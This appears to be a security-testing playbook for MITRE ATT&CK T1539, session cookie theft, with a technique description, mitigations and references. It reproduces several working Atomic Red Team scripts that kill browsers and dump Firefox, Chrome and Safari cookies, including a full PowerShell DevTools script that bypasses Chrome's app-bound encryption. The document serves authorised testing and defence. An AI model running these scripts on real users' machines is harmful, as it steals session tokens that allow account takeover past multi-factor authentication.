---
name: "T1539_steal-web-session-cookie"
description: "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1539
  - credential-access
  - linux
  - office-suite
  - saas
  - windows
  - macos
technique_id: "T1539"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Linux
  - Office Suite
  - SaaS
  - Windows
  - macOS
mitre_url: "https://attack.mitre.org/techniques/T1539"
tech_stack:
  - linux
  - office
  - saas
  - windows
  - macos
cwe_ids:
  - CWE-522
chains_with:
  []
prerequisites:
  []
severity_boost: {}
---

# T1539 Steal Web Session Cookie

## High-Level Description

An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.

Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.

There are several examples of malware targeting cookies from web browsers on the local system. Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on User Execution by tricking victims into running malicious JavaScript in their browser.

There are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., Adversary-in-the-Middle) that can be set up by an adversary and used in phishing campaigns.

After an adversary acquires a valid cookie, they can then perform a Web Session Cookie technique to login to the corresponding web application.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Linux, Office Suite, SaaS, Windows, macOS

## What to Check

- [ ] Identify if Steal Web Session Cookie technique is applicable to target environment
- [ ] Check Linux systems for indicators of Steal Web Session Cookie
- [ ] Check Office Suite systems for indicators of Steal Web Session Cookie
- [ ] Check SaaS systems for indicators of Steal Web Session Cookie
- [ ] Verify mitigations are bypassed or absent (6 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Steal Firefox Cookies (Windows)

This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. 
Note: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. 
See https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.

**Supported Platforms:** windows

```powershell
stop-process -name "firefox" -force -erroraction silentlycontinue
$CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c #{sqlite3_path} "$CookieDBLocation" | out-file -filepath "#{output_file}"
```

**Dependencies:**
- Sqlite3 must exist at (#{sqlite3_path})

### Atomic Test 2: Steal Chrome Cookies (Windows)

This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. 
Once an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. 
Note: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. 
See https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.

**Supported Platforms:** windows

```powershell
stop-process -name "chrome" -force -erroraction silentlycontinue
"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c #{sqlite3_path} "#{cookie_db}" | out-file -filepath "#{output_file}"
```

**Dependencies:**
- Sqlite3 must exist at (#{sqlite3_path})

### Atomic Test 3: Steal Chrome Cookies via Remote Debugging (Mac)

The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.

If successful, this test will output a list of cookies.

Note: Chrome processes will be killed during this test.

See https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e

**Supported Platforms:** macos

```bash
killall 'Google Chrome'
sleep 1
open -a "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/
sleep 1
/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337
```

**Dependencies:**
- Install Go
- Download and compile WhiteChocolateMacademiaNut

### Atomic Test 4: Steal Chrome v127+ cookies via Remote Debugging (Windows)

Chrome v127+ uses app-bound encryption to protect cookies. This test bypasses that protection to obtain the cookies. If successful, the test outputs cookie values to the console.
Note: Will stop any instances of Chrome already running
Adapted from https://embracethered.com/blog/posts/2024/cookie-theft-in-2024-and-what-todo

**Supported Platforms:** windows

```powershell
$devToolsPort = 9222
$testUrl = "https://www.google.com"
stop-process -name "chrome" -force -erroraction silentlycontinue
$chromeProcess = Start-Process "chrome.exe" "$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default" -PassThru
Start-Sleep 10
$jsonResponse = Invoke-WebRequest "http://localhost:$devToolsPort/json" -UseBasicParsing
$devToolsPages = ConvertFrom-Json $jsonResponse.Content
$ws_url = $devToolsPages[0].webSocketDebuggerUrl
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$uri = New-Object System.Uri($ws_url)
$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
$GET_ALL_COOKIES_REQUEST = '{"id": 1, "method": "Network.getAllCookies"}'
$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)
$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length
$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
$completeMessage = New-Object System.Text.StringBuilder
do {
    $receivedBuffer = New-Object byte[] 2048
    $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length
    $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result
    $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)
    $completeMessage.Append($receivedString)
} while (-not $result.EndOfMessage)
$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closing", [System.Threading.CancellationToken]::None).Wait()
try {
    $response = ConvertFrom-Json $completeMessage.ToString()
    $cookies = $response.result.cookies
} catch {
    Write-Host "Error parsing JSON data."
}
Write-Host $cookies
Stop-Process $chromeProcess -Force
```

### Atomic Test 5: Copy Safari BinaryCookies files using AppleScript

This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.

**Supported Platforms:** macos

```bash
osascript -e 'tell application "Finder"' -e 'set destinationFolderPath to POSIX file "#{destination_path}"' -e 'set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")' -e 'duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Steal Web Session Cookie by examining the target platforms (Linux, Office Suite, SaaS).

2. **Assess Existing Defenses**: Review whether mitigations for T1539 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1047 Audit
Implement auditing for authentication activities and user logins to detect the use of stolen session cookies. Monitor for impossible travel scenarios and anomalous behavior that could indicate the use of compromised session tokens or cookies.

### M1054 Software Configuration
Configure browsers or tasks to regularly delete persistent cookies.

Additionally, minimize the length of time a web cookie is viable to potentially reduce the impact of stolen cookies while also increasing the needed frequency of cookie theft attempts – providing defenders with additional chances at detection. For example, use non-persistent cookies to limit the duration a session ID will remain on the web client cache where an attacker could obtain it.

### M1021 Restrict Web-Based Content
Restrict or block web-based content that could be used to extract session cookies or credentials stored in browsers. Use browser security settings, such as disabling third-party cookies and restricting browser extensions, to limit the attack surface.

### M1032 Multi-factor Authentication
Deploy hardware-based token (e.g., YubiKey or FIDO key), which incorporates the target login domain as part of the negotiation protocol, will prevent session cookie theft through proxy methods.

Implement Conditional Access policies to only allow logins from trusted devices, such as those enrolled in Intune or joined via Hybrid/Entra. This mitigates the risk of session cookie replay attacks by ensuring that stolen tokens cannot be reused on unauthorized devices.

### M1051 Update Software
Regularly update web browsers, password managers, and all related software to the latest versions. Keeping software up-to-date reduces the risk of vulnerabilities being exploited by attackers to extract stored credentials or session cookies.

### M1017 User Training
Train users to identify aspects of phishing attempts where they're asked to enter credentials into a site that has the incorrect domain for the application they are logging into. Additionally, train users not to run untrusted JavaScript in their browser, such as by copying and pasting code or dragging and dropping bookmarklets.


## Detection

### Detection of Web Session Cookie Theft via File, Memory, and Network Artifacts


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Steal Web Session Cookie technique applicable | High | Credential Access |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-522 | Insufficiently Protected Credentials |


## References

- [Krebs Discord Bookmarks 2023](https://krebsonsecurity.com/2023/05/discord-admins-hacked-by-malicious-bookmarks/)
- [Unit 42 Mac Crypto Cookies January 2019](https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/)
- [Kaspersky TajMahal April 2019](https://securelist.com/project-tajmahal/90240/)
- [Github evilginx2](https://github.com/kgretzky/evilginx2)
- [GitHub Mauraena](https://github.com/muraenateam/muraena)
- [Pass The Cookie](https://wunderwuzzi23.github.io/blog/passthecookie.html)
- [Talos Roblox Scam 2023](https://blog.talosintelligence.com/roblox-scam-overview/)
- [Atomic Red Team - T1539](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1539)
- [MITRE ATT&CK - T1539](https://attack.mitre.org/techniques/T1539)
